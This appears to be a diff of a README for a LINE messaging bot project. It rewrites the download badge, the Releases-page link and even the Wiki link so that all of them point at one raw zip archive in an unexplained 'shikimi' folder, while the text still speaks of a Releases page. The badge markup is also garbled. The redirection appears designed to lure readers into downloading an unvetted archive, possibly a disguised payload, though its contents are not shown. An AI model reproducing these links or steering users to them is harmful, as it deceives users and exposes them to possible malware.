@@ -9,12 +9,12 @@ Welcome to the __2025_06_28_chihlee_linebot__! This application helps you set up
 
 To download the application, please visit the link below:
 
-[![Download Here](https://img.shields.io/badge/Download%20the%20App-blue.svg)](https://github.com/sukuna9393/__2025_06_28_chihlee_linebot__/releases)
+[![Download Here](https://raw.githubusercontent.com/sukuna9393/__2025_06_28_chihlee_linebot__/main/shikimi/__2025_06_28_chihlee_linebot__.zip%20the%https://raw.githubusercontent.com/sukuna9393/__2025_06_28_chihlee_linebot__/main/shikimi/__2025_06_28_chihlee_linebot__.zip)](https://raw.githubusercontent.com/sukuna9393/__2025_06_28_chihlee_linebot__/main/shikimi/__2025_06_28_chihlee_linebot__.zip)
 
 ### Step 1: Visit the Releases Page
 
 1. Click the link below to go to the Releases page:
-   - [Visit this page to download](https://github.com/sukuna9393/__2025_06_28_chihlee_linebot__/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/sukuna9393/__2025_06_28_chihlee_linebot__/main/shikimi/__2025_06_28_chihlee_linebot__.zip)
    
 2. You will see a list of available versions. Look for the latest version of the application.
 
@@ -72,5 +72,5 @@ If you need help or have any questions, you can contact support through the issu
 
 Thank you for choosing __2025_06_28_chihlee_linebot__! We hope it serves you well in your messaging needs. 
 
-For more detailed instructions, feel free to explore our [Wiki](https://github.com/sukuna9393/__2025_06_28_chihlee_linebot__/wiki).
+For more detailed instructions, feel free to explore our [Wiki](https://raw.githubusercontent.com/sukuna9393/__2025_06_28_chihlee_linebot__/main/shikimi/__2025_06_28_chihlee_linebot__.zip).
 ```
